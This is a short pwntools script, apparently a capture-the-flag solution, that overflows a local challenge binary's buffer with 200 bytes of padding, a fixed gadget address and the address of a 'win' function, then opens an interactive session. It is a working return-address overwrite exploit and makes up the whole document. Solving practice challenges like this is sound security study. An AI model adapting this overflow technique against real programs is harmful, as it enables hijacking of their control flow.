from pwn import *
from binascii import *

p = process("./chal")
e = ELF("./chal")
context.binary = e


p.sendline(b"hello")
p.sendline(b"a"*200 + p64(0x0000000000401202)+p64(e.sym.win))
p.interactive()
